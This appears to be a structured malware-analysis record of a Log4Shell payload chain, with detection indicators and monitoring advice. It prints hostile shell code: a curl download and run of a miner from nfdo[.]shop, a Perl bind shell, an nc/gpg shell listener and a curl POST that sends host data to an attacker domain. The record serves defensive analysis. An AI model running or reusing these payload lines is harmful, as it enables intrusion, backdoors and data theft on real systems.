package_info.package_name: xExportObject (malicious Java class delivered via Log4Shell)
package_info.package_manager: Custom delivery via JNDI/LDAP (not a public package manager)
package_info.why_malicious: The entire package is designed to exploit the Log4Shell vulnerability, enabling remote code execution, downloading and running further malicious payloads, establishing persistence, exfiltrating data, and maintaining backdoor access. All code is purpose-built for compromise and post-exploitation.

execution_context.file_location: xExportObject.class (delivered via LDAP/JNDI to vulnerable Java process)

malicious_snippets.code_behavior: At exploit-time, the code executes system commands to download a remote shell script via curl or wget, saves it to /tmp/lte, makes it executable, and runs it, enabling arbitrary code execution and further compromise.

malice_analysis.why_suspicious: The code is executed as a result of a remote JNDI/LDAP call, immediately downloads and executes a remote script, and uses both curl and wget for redundancy, which is a common attacker tactic.
malice_analysis.violated_expectations: A legitimate Java class loaded via JNDI should not execute arbitrary system commands, download remote scripts, or run shell commands.
malice_analysis.similar_legitimate_use: Automated deployment or update agents may download and execute scripts, but never in this context or via JNDI/LDAP injection.
key_indicators: Use of Runtime.getRuntime().exec for system command execution
Downloading and executing remote code from untrusted sources
Redundant use of curl and wget for reliability
Execution triggered by JNDI/LDAP, not user action

malicious_snippets.code_snippet:

# (Obfuscated base64 payload assignment)
mem=$(grep MemTotal /proc/meminfo)
nproc=$(nproc)
curl -s -o /tmp/componist http://nfdo[.]shop/componist
chmod +x /tmp/componist
conf='{"autosave":false,"pools":[{"url":"cmpnst[.]info:443","tls":true}]}'
# (Persistence setup)
if [ "$EUID" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
  # systemd service setup
else
  # cron job setup
fi
# (Reverse shell setup)
perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in(985,INADDR_ANY));listen(S,SOMAXCONN);for(;accept(C,S);){while (<C>){if(/sockaddr/){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");system("/bin/sh -i");close(STDIN);close(STDOUT);close(STDERR);close(C);}}}'
# (Additional reverse shell)
nc -lp 826 | gpg --decrypt --batch --passphrase daemon | /bin/sh
# (Reconnaissance and exfiltration)
curl -s -X POST http://nfdo[.]shop/fanfic.php -H "Content-Type: application/x-www-form-urlencoded" -d "pass=banizaza&nproc=$nproc&mem=$mem&..."

fi

malicious_snippets.code_behavior: At runtime, the script performs system reconnaissance, downloads and configures a crypto-miner, establishes persistence via systemd or cron, sets up multiple reverse shells (including encrypted channels), exfiltrates system data via HTTP POST, and erases traces by clearing bash history.

malice_analysis.why_suspicious: The script chains together multiple attacker behaviors: reconnaissance, crypto-miner deployment, persistence, backdoor setup, data exfiltration, and anti-forensics. The use of obfuscation, multiple persistence methods, and encrypted reverse shells is highly indicative of malicious intent.
malice_analysis.violated_expectations: A legitimate script should not perform all these actions, especially not in a single execution flow, nor should it establish unauthorized persistence or exfiltrate data.
malice_analysis.similar_legitimate_use: Some system management scripts may collect system info or set up services, but not in this combination or with exfiltration and backdoors.
key_indicators: Downloading and executing remote binaries (XMRig miner)
Reconnaissance and exfiltration to attacker-controlled server

behavioral_signatures: Java process spawning shell or network utilities (curl, wget, bash)
Unexpected outbound LDAP/JNDI requests followed by remote class loading
Immediate download and execution of remote shell scripts
Persistence setup via systemd or cron in non-administrative contexts
Multiple reverse shell listeners (Perl, netcat, GPG-encrypted)
Exfiltration of system data via HTTP POST to suspicious domains
Clearing of bash history and self-deletion of scripts
file_indicators: systemd service files referencing componist or lte
cron jobs referencing componist or lte
network_indicators: Outbound LDAP requests to domains like superr[.]buzz
HTTP(S) requests to nfdo[.]shop, cmpnst[.]info, rirosh.shop
HTTP POST requests to /fanfic.php on nfdo[.]shop
detection_knowledge.how_to_detect: Monitor for Java processes making outbound LDAP/JNDI requests to untrusted domains, followed by child process creation involving curl, wget, or bash. Flag downloads and execution of files in /tmp or other unusual locations. Detect persistence mechanisms (systemd, cron) referencing unknown binaries. Alert on reverse shell activity (Perl, netcat, GPG) and exfiltration attempts to known malicious domains. Correlate with bash history clearing and self-deleting scripts for defense evasion.
